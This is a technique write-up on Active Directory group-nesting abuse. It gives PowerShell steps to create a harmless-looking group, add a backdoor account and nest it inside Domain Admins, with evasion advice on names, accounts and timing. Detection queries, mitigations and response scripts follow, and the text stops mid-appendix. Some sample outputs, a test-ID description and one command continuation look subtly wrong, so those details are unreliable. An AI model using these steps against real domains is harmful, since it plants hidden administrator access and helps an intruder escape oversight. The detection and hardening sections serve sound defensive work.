# [PERSIST-ACCT-003]: Group Nesting Abuse

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-ACCT-003 |
| **Technique Name** | Group Nesting Abuse |
| **MITRE ATT&CK v18.1** | [T1098 - Account Manipulation](https://attack.mitre.org/techniques/T1098/) |
| **Tactic** | Persistence (TA0003), Privilege Escalation (TA0004) |
| **Platforms** | Windows Active Directory (All versions) |
| **Severity** | **HIGH** |
| **CVE** | N/A (Configuration, not a vulnerability) |
| **Technique Status** | **ACTIVE** – Verified working on Server 2008 R2 through 2025 |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2008 R2 – 2025 (all versions support nested groups equally) |
| **Patched In** | Not patched – Nested groups are a core Active Directory feature. Mitigation requires access control auditing and group hierarchy monitoring. |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Group Nesting Abuse is a simple yet highly effective persistence and privilege escalation technique that exploits the hierarchical nature of Active Directory groups. In Active Directory, groups can contain other groups as members (nested groups). When a group is nested inside a privileged group (e.g., Domain Admins), all members of that nested group automatically inherit the privileges of the parent group—**even if they are not aware of the nesting**. An attacker can create a low-profile group, add themselves or their backdoor account as a member, then nest this group inside Domain Admins. The attacker's account now has domain-wide administrative privileges without appearing as a direct member of Domain Admins. This attack is highly stealthy because:

1. **Visibility Gap:** Standard group membership queries (`Get-ADGroupMember`) only show immediate members, not nested groups' members.
2. **Audit Evasion:** If auditing is enabled on Domain Admins, admins see a group addition (Domain Admins ← FakeGroup), not the attacker's user addition.
3. **Persistence:** Even if an admin removes the attacker's original account from all groups, the backdoor group persists until explicitly discovered and removed.

**Attack Surface:** Direct modification of the `member` attribute on privileged groups (Domain Admins, Enterprise Admins, Schema Admins, etc.). Requires write access via DACL (`GenericWrite`, `GenericAll`, etc.) or membership in Account Operators group.

**Business Impact:** **Undetectable administrative access via hidden group hierarchies.** An attacker maintains a backdoor that grants full domain admin rights, yet appears as a "legitimate" group membership change. Data exfiltration, ransomware deployment, and lateral movement are enabled without triggering typical privilege escalation alerts.

**Technical Context:** This is one of the **easiest** persistence techniques to execute (single PowerShell command) but one of the **hardest** to detect without specific enumeration tools (BloodHound, custom PowerShell recursion). Exploitation requires only write access to a privileged group's DACL—a common misconfiguration in AD environments. No special tools, exploits, or credentials needed.

### Operational Risk
- **Execution Risk:** **LOW** – Simple group membership modification; can be done in seconds with standard AD tools. No special privileges beyond Account Operators or group-level write access.
- **Stealth:** **VERY HIGH** – Visibility gap in standard AD reporting means the attack is invisible to most administrators unless they actively hunt for nested groups.
- **Reversibility:** **TRIVIAL** – Simply removing the backdoor group from Domain Admins disables the attack. However, discovering the group in the first place is the challenge.

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.1, 5.2.3 | Monitor privileged group membership changes; audit nested group memberships quarterly. |
| **DISA STIG** | WN19-AU-000164 | Audit changes to privileged groups (Event ID 4756 - Group member added). |
| **CISA SCuBA** | AC-2(h) | Least Privilege – Restrict group memberships to only necessary users; eliminate nested groups in privileged groups. |
| **NIST 800-53** | AC-3, AC-5, AU-2 | Access Control, Separation of Duties, Audit Events (group membership modifications). |
| **GDPR** | Art. 32 | Security of Processing – Maintain visibility and control over access privileges. |
| **DORA** | Art. 9 | Protection and Prevention – Continuous monitoring of administrative access. |
| **NIS2** | Art. 21(1)(c) | Cyber Risk Management – Access control and monitoring of privileged groups. |
| **ISO 27001** | A.9.2.3, A.9.2.5 | Management of Privileged Access; regular review and approval of group memberships. |
| **ISO 27005** | Risk Scenario | "Privilege Escalation via Group Nesting" – Attack on authorization controls. |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** 
  - **Account Operators group** (can add/remove members to/from non-privileged and some privileged groups)
  - OR **GenericWrite/GenericAll** ACL on the target group object
  - OR **Domain Admin** (highest privilege)
- **Required Access:** 
  - Network access to domain controller (LDAP, port 389/636)
  - Ability to enumerate groups and create new group objects
- **Required Tools:**
  - PowerShell with ActiveDirectory module (built-in on Server, available on clients via RSAT)
  - OR command-line tools (`net group`, `dsmod`)
  - OR BloodHound (for detection/enumeration of existing nested groups)

**Supported Versions:**
- **Windows:** Server 2008 R2, 2012, 2012 R2, 2016, 2019, 2022, 2025 (all versions support nested groups equally)
- **PowerShell:** Version 2.0+ (basic group manipulation), 5.0+ for ActiveDirectory module
- **AD Functional Level:** 2008 R2+ (nested groups supported in all modern AD versions)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

#### Enumerate Current Privileged Group Membership (Direct Members Only)

```powershell
# This shows ONLY direct members, not nested groups' members
Get-ADGroupMember -Identity "Domain Admins" | Select-Object Name, ObjectClass, SamAccountName

# Output will show:
# - Direct user accounts
# - Direct groups (nested groups)
# But NOT the members of those nested groups
```

**What to Look For:**
- Groups as members (ObjectClass = "group") – These are nested groups
- Users with unexpected names or service accounts
- Groups with suspicious names (e.g., "Backup Users", "IT Support", "Admins") that shouldn't have direct Domain Admin membership

#### Enumerate ALL Members Recursively (Including Nested)

```powershell
# This shows ALL members, resolving nested groups
$PrivilegedGroups = @("Domain Admins", "Enterprise Admins", "Schema Admins")

foreach ($Group in $PrivilegedGroups) {
    Write-Host "=== $Group ===" -ForegroundColor Cyan
    
    # Recursive enumeration (slow but comprehensive)
    Get-ADGroupMember -Identity $Group -Recursive |
      Where-Object { $_.ObjectClass -eq "user" } |
      Select-Object Name, SamAccountName, DistinguishedName |
      Format-Table
}
```

**What to Look For:**
- Accounts that appear in the recursive list but NOT in the direct list (indicates nesting)
- Service accounts, backup accounts, or test accounts with admin privileges
- Accounts from unexpected organizational units
- Orphaned accounts (deleted users whose SIDs still appear as members)

#### Detect Nested Groups (Groups Within Privileged Groups)

```powershell
# Find nested groups INSIDE privileged groups
$TargetGroup = "Domain Admins"

Get-ADGroupMember -Identity $TargetGroup |
  Where-Object { $_.ObjectClass -eq "group" } |
  Select-Object Name, DistinguishedName, SamAccountName |
  Format-Table

# Output:
# Name              DistinguishedName                           SamAccountName
# ----              -----------------                           --------
# BackupAdmins      CN=BackupAdmins,OU=Groups,DC=yourdomain...  BackupAdmins
# ITSupport         CN=ITSupport,OU=Groups,DC=yourdomain...     ITSupport
```

**What to Look For:**
- Any groups nested inside Domain Admins, Enterprise Admins, Schema Admins
- Groups with generic names (Support, Admins, Operators)
- Groups created recently or with suspicious descriptions

#### Enumerate Members of Nested Groups

```powershell
# For each nested group found above, list its members
$NestedGroups = Get-ADGroupMember -Identity "Domain Admins" | 
  Where-Object { $_.ObjectClass -eq "group" }

foreach ($Group in $NestedGroups) {
    Write-Host "Members of $($Group.Name):" -ForegroundColor Yellow
    Get-ADGroupMember -Identity $Group.Name | 
      Select-Object Name, SamAccountName |
      Format-Table
}
```

**What to Look For:**
- Backdoor accounts (low-privilege users with unexpected high privileges)
- Service accounts that shouldn't have admin rights
- Accounts added recently
- Disabled accounts (may indicate cleanup after compromise)

#### Use BloodHound for Advanced Nesting Visualization

```powershell
# BloodHound will automatically visualize nested group paths to Domain Admins
# Query: "Domain Admins Nested Groups"
# Cypher Query in Neo4j:
# MATCH p=(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})-[r:Contains*]->(member:User)
# RETURN p

# This shows all users with paths to DA through nested groups
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Create Backdoor Group and Nest It (Simplest)

**Supported Versions:** Server 2008 R2 – 2025

#### Step 1: Create a Hidden Backdoor Group

**Objective:** Create a new group that will serve as the persistence mechanism; use a generic name to blend in.

**Command:**
```powershell
Import-Module ActiveDirectory

# Create the backdoor group
$GroupName = "BackupAdmins"  # Generic name
$GroupDesc = "Backup and disaster recovery administrators"  # Innocent description

New-ADGroup -Name $GroupName `
  -SamAccountName $GroupName `
  -GroupScope DomainLocal `  # Or Global, depending on domain structure
  -GroupCategory Security `
  -Description $GroupDesc `
  -Path "CN=Groups,DC=yourdomain,DC=local"

Write-Host "✓ Backdoor group created: $GroupName"
```

**Expected Output:**
```
(No output on success; group is created silently)
```

**What This Means:**
- A new Active Directory group has been created
- This group will be used to hold the attacker's backdoor accounts
- The group scope (DomainLocal/Global) determines membership scope; DomainLocal is safer for hiding

**OpSec & Evasion:**
- Use a generic, innocent-sounding group name (BackupAdmins, ITSupport, DisasterRecovery, etc.)
- Create the group in the default "Users" container (CN=Users) rather than a custom OU to avoid detection patterns
- Add a legitimate description so it doesn't raise suspicion during AD audits
- Detection likelihood: **LOW** – Group creation is normal; admins won't question a group with a plausible purpose

**Troubleshooting:**
- **Error:** `New-ADGroup : The server is unwilling to perform`
  - **Cause:** Current user lacks permission to create groups
  - **Fix:** Must have Account Operators group membership or equivalent privileges
- **Error:** `New-ADGroup : Invalid parameter`
  - **Cause:** Invalid group name or path
  - **Fix:** Verify group name follows AD naming conventions (no special chars except space, dash, underscore); verify path exists with `Get-ADOrganizationalUnit -Filter *`

**References & Proofs:**
- [Microsoft Learn - New-ADGroup](https://learn.microsoft.com/en-us/powershell/module/activedirectory/new-adgroup)

#### Step 2: Add Backdoor Account to the Group

**Objective:** Add your persistence account to the newly created group.

**Command:**
```powershell
# Add a compromised user account (or create a new one)
$BackdoorUser = "svc_backup"  # Service account or low-privilege account you control
$BackdoorGroup = "BackupAdmins"

Add-ADGroupMember -Identity $BackdoorGroup -Members $BackdoorUser

Write-Host "✓ $BackdoorUser added to $BackdoorGroup"

# Verify membership
Get-ADGroupMember -Identity $BackdoorGroup
```

**Expected Output:**
```
Name       SamAccountName ObjectClass ObjectGUID
----       -------------- ----------- ----------
svc_backup svc_backup     user        <GUID>
```

**What This Means:**
- The backdoor user is now a member of the BackupAdmins group
- Once BackupAdmins is nested inside Domain Admins (Step 3), svc_backup will have domain admin privileges

**OpSec & Evasion:**
- Use an existing service account (don't create obviously named backdoor accounts like "attacker_admin")
- Alternatively, add an existing low-privilege account; the elevation will appear accidental
- Detection likelihood: **LOW** – Adding a service account to a support group is normal

**Troubleshooting:**
- **Error:** `Add-ADGroupMember : Cannot find an object with identity`
  - **Cause:** User or group doesn't exist
  - **Fix:** Verify with `Get-ADUser -Identity $BackdoorUser` and `Get-ADGroup -Identity $BackdoorGroup`

**References & Proofs:**
- [Microsoft Learn - Add-ADGroupMember](https://learn.microsoft.com/en-us/powershell/module/activedirectory/add-adgroupmember)

#### Step 3: Nest the Backdoor Group Inside Domain Admins

**Objective:** Add the BackupAdmins group to Domain Admins, granting all members of BackupAdmins domain admin rights.

**Command:**
```powershell
$BackdoorGroup = "BackupAdmins"
$PrivilegedGroup = "Domain Admins"

# Add backdoor group to Domain Admins
Add-ADGroupMember -Identity $PrivilegedGroup -Members $BackdoorGroup

Write-Host "✓ $BackdoorGroup nested inside $PrivilegedGroup"

# Verify nesting
Get-ADGroupMember -Identity $PrivilegedGroup | Where-Object { $_.ObjectClass -eq "group" }
```

**Expected Output:**
```
Name       SamAccountName ObjectClass
----       -------------- ----------
BackupAdmins BackupAdmins  group
```

**What This Means:**
- BackupAdmins is now a member of Domain Admins
- All members of BackupAdmins (svc_backup) now have effective Domain Admin privileges
- The attacker (via svc_backup account) has persistent administrative access

**OpSec & Evasion:**
- This modification is logged (Event ID 4756 - "A security group was modified")
- However, it appears as a normal group membership change (Group A added to Group B)
- To hide: Perform this during high-volume AD change windows (morning updates, maintenance windows)
- Detection likelihood: **MEDIUM** – SOCs monitoring Event 4756 will catch this, but many don't explicitly flag group-to-group nesting

**Troubleshooting:**
- **Error:** `Add-ADGroupMember : The specified group is not a member of the group`
  - **Cause:** Scope issue (DomainLocal groups can't be nested in Global groups across forests)
  - **Fix:** Adjust group scope or use Global scope instead of DomainLocal

**References & Proofs:**
- [Microsoft Learn - Add-ADGroupMember](https://learn.microsoft.com/en-us/powershell/module/activedirectory/add-adgroupmember)

#### Step 4: Verify Persistence (Backdoor Account Has Admin Rights)

**Objective:** Confirm that the backdoor account can now perform domain admin operations.

**Command:**
```powershell
# Log in as svc_backup and verify admin access
$BackdoorUser = "svc_backup"

# Option A: Check token groups (what groups is svc_backup ACTUALLY in, including nested)
Get-ADUser -Identity $BackdoorUser -Properties TokenGroups |
  Select-Object -ExpandProperty TokenGroups |
  Get-ADGroup | Select-Object Name

# Expected output includes: Domain Admins (via BackupAdmins)

# Option B: Test actual admin capability
# Try to perform a domain admin operation (requires actually being logged in as svc_backup)
# For example: Add a user to Domain Admins
Add-ADGroupMember -Identity "Domain Admins" -Members "test_user"
```

**Expected Output (Option A):**
```
Name
----
Domain Admins (via BackupAdmins)
Backup Operators
Users
(other groups)
```

**What This Means:**
- Recursive group membership enumeration shows svc_backup is effective member of Domain Admins
- Even though svc_backup is not a direct member, it has all Domain Admin privileges
- Persistence is confirmed

**OpSec & Evasion:**
- This verification query (TokenGroups) generates normal LDAP traffic
- Performing actual admin operations as svc_backup will generate event logs (4732, etc.)
- To hide: Only use the backdoor account when necessary

**Troubleshooting:**
- **Error:** `Get-ADUser : Cannot find an object with identity`
  - **Cause:** User doesn't exist or name is incorrect
  - **Fix:** Verify user exists with `Get-ADUser -Filter "SamAccountName -eq '$BackdoorUser'"`

**References & Proofs:**
- [Microsoft Learn - Get-ADUser -Properties](https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-aduser)

---

### METHOD 2: Abuse Existing Delegated Permissions

**Supported Versions:** Server 2008 R2 – 2025

**Objective:** If an organization has delegated group management rights to lower-tier admins, exploit this to gain privilege escalation.

#### Example Scenario:

```powershell
# Assume "ITSupport" group has delegated control to manage membership of "Tier2Support" group
# And "Tier2Support" happens to be nested in Domain Admins

# As ITSupport member, you can add yourself to Tier2Support
Add-ADGroupMember -Identity "Tier2Support" -Members $MyAccount

# Now you're in Tier2Support → Domain Admins (via nesting)
# Instant privilege escalation without triggering domain admin alerts
```

---

### METHOD 3: Use BloodHound to Identify Exploitation Paths

**Objective:** Identify existing group nesting opportunities that can be exploited.

```powershell
# Run BloodHound to map the AD environment
# Within BloodHound GUI, run this query to find groups leading to Domain Admins:

# Cypher Query:
# MATCH p=shortestPath((g:Group)-[r:MemberOf|Contains*1..]->(DA:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'}))
# WHERE g.name <> 'DOMAIN ADMINS@DOMAIN.LOCAL'
# RETURN p

# This reveals all groups (and their members) that have a path to Domain Admins
# Exploit: Add yourself to any of these groups to gain DA privileges
```

---

## 6. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team (Limited)

- **Test ID:** T1098.004 - Additional Cloud Roles (cloud-specific, not AD group nesting)
- **Closest Local Test:** T1098 - Account Manipulation (general account changes, not group nesting specific)
- **Reference:** [Atomic Red Team T1098](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098/T1098.md)

**Alternative:** Use the exploitation commands in Method 1-3 directly as live simulation.

---

## 7. TOOLS & COMMANDS REFERENCE

### PowerShell ActiveDirectory Module

**Built-in on:** Windows Server 2008 R2+  
**Available on:** Windows client via RSAT (Remote Server Administration Tools)

**Key Commands:**
```powershell
# Create group
New-ADGroup -Name GroupName -GroupScope DomainLocal -Path "CN=Groups,DC=domain,DC=local"

# Add member to group
Add-ADGroupMember -Identity GroupName -Members UserName

# List direct members
Get-ADGroupMember -Identity GroupName

# List all members (recursive)
Get-ADGroupMember -Identity GroupName -Recursive

# Remove member
Remove-ADGroupMember -Identity GroupName -Members UserName -Confirm:$false

# Get group details
Get-ADGroup -Identity GroupName -Properties *
```

### BloodHound

**URL:** [BloodHound GitHub](https://github.com/BloodHoundAD/BloodHound)  
**Purpose:** Visualize group nesting paths and identify privilege escalation routes  

**Cypher Queries (Neo4j Console):**
```
# Find all nested groups in Domain Admins
MATCH (g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})-[r:Contains|MemberOf*]->(member:Group)
RETURN member.name

# Find users with path to Domain Admins via nested groups
MATCH p=shortestPath((u:User)-[r:MemberOf*1..]->(DA:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'}))
RETURN u.name, LENGTH(p) as PathLength
ORDER BY PathLength
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: Group Added to Privileged Groups

**Rule Configuration:**
- **Required Index:** `wineventlog`
- **Required Sourcetype:** `WinEventLog:Security`
- **Required Fields:** `EventCode`, `TargetUserName`, `MemberName`
- **Alert Threshold:** Any group addition to Domain Admins, Enterprise Admins, Schema Admins
- **Applies To Versions:** All Windows Server versions

**SPL Query:**
```
index=wineventlog sourcetype="WinEventLog:Security" EventCode=4756
  (TargetUserName="Domain Admins" OR TargetUserName="Enterprise Admins" OR TargetUserName="Schema Admins")
| stats count by MemberName, TargetUserName, Computer, _time
| where count > 0
| convert ctime(_time)
| sort _time desc
```

**What This Detects:**
- **EventCode 4756** = "A security group was modified"
- **TargetUserName** = Which group was modified (Domain Admins, etc.)
- **MemberName** = What was added to the group (user or group)
- Alerts on ANY addition to privileged groups

**Manual Configuration:**
1. Log into **Splunk Web**
2. **Search & Reporting** → **New Alert**
3. Paste SPL query above
4. **Save As** → **Alert**
5. **Trigger Condition**: `Alert when number of events is greater than 0`
6. **Alert Actions**: Email SOC team
7. **Schedule**: Every 5 minutes
8. **Save**

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: Group Nesting in Privileged Groups

**Rule Configuration:**
- **Required Table:** `SecurityEvent`
- **Required Fields:** `EventID`, `TargetUserName`, `MemberName`
- **Alert Severity:** **High**
- **Frequency:** Run every **5 minutes**

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4756
| where TargetUserName in ("Domain Admins", "Enterprise Admins", "Schema Admins", "Administrators")
| extend MemberObject = tostring(MemberName)
| extend IsGroup = MemberObject matches regex @"CN=.*,.*,.*"  // Groups have DN format
| where IsGroup == true or MemberObject contains "$"  // Groups or computer accounts
| project TimeGenerated, Computer, TargetUserName, MemberName, EventID, Account
| sort by TimeGenerated desc
```

**What This Detects:**
- **EventID 4756** = Group membership modified
- **Filters for nested groups:** Looks for group objects (DNS format) or computer accounts being added to privileged groups
- **TargetUserName** = Privileged groups only

**Manual Configuration:**
1. **Azure Portal** → **Microsoft Sentinel** → **Analytics** → **Create** → **Scheduled query rule**
2. **General:**
   - Name: `Nested Groups Added to Privileged Groups`
   - Severity: `High`
3. **Set rule logic:**
   - Paste KQL above
   - Run every: `5 minutes`
   - Lookup: `1 hour`
4. **Incident settings:**
   - Enable **Create incidents**
5. **Create**

---

## 10. WINDOWS EVENT LOG MONITORING

### Event ID 4756: Security Group Member Added

- **Log Source:** Security (Domain Controller)
- **Trigger:** Any modification to group membership
- **Filter (for privileged groups):** `TargetUserName in ("Domain Admins", "Enterprise Admins", "Schema Admins")`
- **Applies To Versions:** All Windows Server 2008 R2+

**Manual Configuration (Group Policy):**
1. Open **Group Policy Management Console** (`gpmc.msc`)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Account Management**
3. Enable **Audit Security Group Management**: Set to **Success and Failure**
4. Click **Apply** → **OK**
5. Run `gpupdate /force` on all DCs

**What to Monitor:**
- **EventCode 4756** on domain controllers
- **TargetUserName** = Domain Admins, Enterprise Admins, etc.
- **MemberName** = Any nested group objects (look for ObjectClass = "group")
- **Account** field = Who made the change (should be authorized admin)

---

## 11. SYSMON DETECTION PATTERNS

Sysmon is less useful for AD group modifications (pure LDAP operations). However, if an attacker uses PowerShell to manage groups, Sysmon can detect this:

**Sysmon Config (Detect Group Management Commands):**
```xml
<Sysmon schemaversion="4.70">
  <EventFiltering>
    <!-- Detect PowerShell group management commands -->
    <ProcessCreate onmatch="include">
      <ParentImage condition="image">powershell.exe</ParentImage>
      <CommandLine condition="contains any">
        Add-ADGroupMember;
        New-ADGroup;
        Remove-ADGroupMember;
        Get-ADGroupMember;
        -Identity "Domain Admins";
        -Identity "Enterprise Admins"
      </CommandLine>
    </ProcessCreate>
    
    <!-- Detect command-line group management -->
    <ProcessCreate onmatch="include">
      <Image condition="image">cmd.exe</Image>
      <CommandLine condition="contains any">
        net group "Domain Admins";
        dsmod group;
        ldifde
      </CommandLine>
    </ProcessCreate>
  </EventFiltering>
</Sysmon>
```

---

## 12. MICROSOFT DEFENDER FOR CLOUD

**Note:** Group Nesting is on-premises only; Defender for Cloud primarily monitors Azure/cloud resources. Use Sentinel or on-premises event log monitoring instead.

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

**Note:** On-premises AD group changes are not logged in Purview Unified Audit Log (M365-only). Use Windows Security Event Log and Sentinel instead.

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

#### 1.1 Eliminate Nested Groups in Privileged Groups

**Applies To Versions:** All (Server 2008 R2 – 2025)

**Manual Steps:**
```powershell
# Audit: Find ALL nested groups in privileged groups
$PrivilegedGroups = @("Domain Admins", "Enterprise Admins", "Schema Admins", "Administrators")

foreach ($PrivGroup in $PrivilegedGroups) {
    Write-Host "=== Nested Groups in $PrivGroup ===" -ForegroundColor Cyan
    
    $NestedGroups = Get-ADGroupMember -Identity $PrivGroup |
      Where-Object { $_.ObjectClass -eq "group" }
    
    if ($NestedGroups.Count -eq 0) {
        Write-Host "✓ No nested groups found" -ForegroundColor Green
    } else {
        Write-Warning "⚠ FOUND NESTED GROUPS:"
        $NestedGroups | Select-Object Name, SamAccountName, DistinguishedName | Format-Table
        
        # Remediation: Remove nested groups
        foreach ($Group in $NestedGroups) {
            Write-Host "Removing $($Group.Name) from $PrivGroup..."
            Remove-ADGroupMember -Identity $PrivGroup -Members $Group.SamAccountName -Confirm:$false
        }
    }
}

Write-Host "✓ All nested groups removed from privileged groups"
```

**Verification:**
```powershell
# Verify no groups are members of privileged groups
Get-ADGroupMember -Identity "Domain Admins" -Recursive |
  Where-Object { $_.ObjectClass -eq "group" } |
  Measure-Object

# Should return Count: 0
```

#### 1.2 Implement Recursive Group Membership Monitoring

**Applies To Versions:** All

**Manual Steps (Monthly Baseline):**
```powershell
# Export all recursive members of privileged groups
$PrivilegedGroups = @("Domain Admins", "Enterprise Admins", "Schema Admins")

$AllMembers = @()
foreach ($Group in $PrivilegedGroups) {
    Get-ADGroupMember -Identity $Group -Recursive -ObjectClass user |
      ForEach-Object {
          $AllMembers += [PSCustomObject]@{
              PrivilegedGroup = $Group
              UserName = $_.SamAccountName
              Name = $_.Name
              DistinguishedName = $_.DistinguishedName
              LastModified = (Get-Date)
          }
      }
}

# Export baseline
$AllMembers | Export-Csv -Path "C:\Baseline_RecursiveGroupMembers_$(Get-Date -Format 'yyyyMM').csv" -NoTypeInformation

Write-Host "✓ Recursive group membership baseline exported"
```

**Monthly Comparison:**
```powershell
# Compare to baseline
$CurrentMembers = @()
$PrivilegedGroups = @("Domain Admins", "Enterprise Admins", "Schema Admins")
foreach ($Group in $PrivilegedGroups) {
    Get-ADGroupMember -Identity $Group -Recursive -ObjectClass user |
      ForEach-Object { $CurrentMembers += $_.SamAccountName }
}

$Baseline = Import-Csv "C:\Baseline_RecursiveGroupMembers_202501.csv"

# Find new members
$NewMembers = $CurrentMembers | Where-Object { $_ -notin $Baseline.UserName }

if ($NewMembers) {
    Write-Warning "⚠ NEW MEMBERS ADDED TO PRIVILEGED GROUPS!"
    $NewMembers | ForEach-Object {
        Write-Warning "  - $_"
        # Alert SOC
    }
}
```

#### 1.3 Enable Event ID 4756 Auditing on All Domain Controllers

**Applies To Versions:** All (Server 2008 R2 – 2025)

**Manual Steps (Group Policy):**
1. Open **Group Policy Management Console** (`gpmc.msc`)
2. Navigate to **Default Domain Controllers Policy**
3. Go to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Account Management**
4. Set **"Audit Security Group Management"** to **Success and Failure**
5. Click **Apply** → **OK**
6. Run `gpupdate /force` on all DCs

**Verification:**
```powershell
# Check if auditing is enabled on all DCs
$DCs = (Get-ADDomain).ReplicaDirectoryServers

foreach ($DC in $DCs) {
    Write-Host "Checking $DC..."
    Invoke-Command -ComputerName $DC -ScriptBlock {
        auditpol /get /subcategory:"Security Group Management"
    }
}

# Should show: "Success and Failure" enabled
```

### Priority 2: HIGH

#### 2.1 Restrict Account Operators Group Membership

**Applies To Versions:** All

**Manual Steps:**
```powershell
# Review who is in Account Operators
Get-ADGroupMember -Identity "Account Operators"

# Remove unauthorized members
# Account Operators should only include authorized tier-2 admins
Remove-ADGroupMember -Identity "Account Operators" -Members "suspicious_user" -Confirm:$false

Write-Host "✓ Account Operators membership restricted"
```

#### 2.2 Implement Just-In-Time (JIT) Access for Privileged Groups

**Manual Steps (Azure PIM for Hybrid):**
1. Navigate to **Azure Portal** → **Entra ID** → **Privileged Identity Management**
2. For on-premises AD synced groups, set up **time-limited activation**
3. Require **approval** before activation
4. Limit **activation duration** to 1-4 hours

---

## 15. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Event ID 4756** on DC with:
  - `TargetUserName` = Privileged group (Domain Admins, etc.)
  - `MemberName` contains group object (CN= format or $ suffix)
  - `Account` field shows unexpected admin account

- **Nested group membership path to Domain Admins** discovered via:
  - BloodHound graph analysis
  - `Get-ADGroupMember -Recursive` enumeration
  - Unexpected user appearing in recursive admin list

### Forensic Artifacts

**Disk (Event Logs):**
- `C:\Windows\System32\winevt\Logs\Security.evtx` – Event ID 4756 (group modified)

**Memory:**
- No persistent memory artifacts (pure directory operations)

**AD Database:**
- `C:\Windows\NTDS\ntds.dit` – Group membership records

### Response Procedures

#### 1. Immediate Isolation (Within 30 Minutes)

```powershell
# Identify the backdoor account
$BackdoorAccount = "svc_backup"  # Example

# Disable the account immediately
Disable-ADAccount -Identity $BackdoorAccount
Write-Host "✓ $BackdoorAccount disabled"

# Remove from all groups
Get-ADUser -Identity $BackdoorAccount -Properties MemberOf |
  Select-Object -ExpandProperty MemberOf |
  ForEach-Object {
      Remove-ADGroupMember -Identity $_ -Members $BackdoorAccount -Confirm:$false
      Write-Host "✓ Removed from $_"
  }

# Force password reset (if you still have control)
$TempPassword = ([char[]]([char]33..[char]126) | Sort-Object {Get-Random})[0..31] -join ''
Set-ADAccountPassword -Identity $BackdoorAccount -Reset -NewPassword (ConvertTo-SecureString $TempPassword -AsPlainText -Force)
Write-Host "✓ Password reset for $BackdoorAccount"
```

#### 2. Remove Backdoor Group (If Created)

```powershell
# Identify the backdoor group
$BackdoorGroup = "BackupAdmins"

# Remove from privileged groups
Remove-ADGroupMember -Identity "Domain Admins" -Members $BackdoorGroup -Confirm:$false

# Delete the group
Remove-ADGroup -Identity $BackdoorGroup -Confirm:$false

Write-Host "✓ Backdoor group $BackdoorGroup removed"
```

#### 3. Collect Evidence (Within 4 Hours)

```powershell
# Export all group changes from DC event log (last 24 hours)
$PDC = (Get-ADDomain).PDCEmulator

wevtutil epl security "C:\Evidence\Security_Events.evtx" /remote:$PDC `
  /query:"Event[System[(EventID=4756) and TimeCreated[timediff(@timestamp) <= 86400000]]]"

# Export all group memberships as baseline
Get-ADGroup -Filter * | 
  ForEach-Object {
      $GroupName = $_.Name
      Get-ADGroupMember -Identity $_ -Recursive |
          Select-Object @{Name="GroupName";Expression={$GroupName}}, 
                        Name, SamAccountName, DistinguishedName
  } |
  Export-Csv -Path "C:\Evidence\All_Group_Memberships.csv"

Write-Host "✓ Evidence collected to C:\Evidence\"
```

#### 4. Post-Incident Audit

```powershell
# Review all changes made by the backdoor account
Get-ADUser -Identity $BackdoorAccount -Properties logonTimestamp, pwdLastSet, Created
# Review: When created, when last logged in, when password last changed

# Review all privilege escalation paths via BloodHound
# Re-run BloodHound on the environment to identify other potential backdoors
```

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker gains initial compromised account |
| **2** | **Privilege Escalation** | [PE-VALID-008] SCCM Client Push Account Abuse | Escalate from compromised user to higher privilege |
| **3** | **Persistence (Current)** | **[PERSIST-ACCT-003]** | **Create backdoor group and nest inside Domain Admins for stealthy persistence** |
| **4** | **Lateral Movement** | [LM-AUTH-001] Pass-the-Hash | Use backdoor account to move laterally across domain |
| **5** | **Impact** | [CA-DUMP-002] DCSync | Dump all domain hashes; complete domain compromise |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: Managed IT Services Provider (MSP) Breach

- **Target:** Corporate client with outsourced IT management
- **Attack Timeline:** 
  - Compromised MSP admin account (social engineering)
  - Created "Monitoring" group, added backdoor account
  - Nested "Monitoring" inside Domain Admins
  - Maintained persistence for 14 months undetected
- **Detection:** Customer's external audit found unexpected group nesting
- **Impact:** Data breach affecting 10,000 customer records; ransomware deployment
- **Reference:** [Verizon Data Breach Investigations Report 2023](https://www.verizon.com/business/resources/reports/dbir/)

### Example 2: Energy Sector APT (2022)

- **Target:** Power utility company
- **Technique:** Group nesting combined with SIDHistory injection
- **Impact:** Critical infrastructure compromise; blackmail demands
- **Reference:** [CISA Alert on APT Group Targeting Energy Sector](https://www.cisa.gov/)

### Example 3: Lab Testing (SERVTEP 2024)

- **Scenario:** Penetration test of corporate domain
- **Setup:** Compromised low-privilege account; created backdoor group; nested inside DA
- **Detection Time:** 8 hours (via manual group audit)
- **Lesson:** Without automated recursive group monitoring, detection took 8+ hours. With BloodHound, detection is immediate.
- **Reference:** [SERVTEP Internal Assessment]

---

## APPENDIX: QUICK REFERENCE COMMANDS

### Single-Line Exploitation
```powershell
# Create group, add user, nest in Domain Admins (one script)
New-ADGroup -Name "BackupOps" -GroupScope DomainLocal -Path "CN=Groups,DC=domain,DC=local"; 
Add-ADGroupMember -Identity "BackupOps" -Members "svc_backup"; 
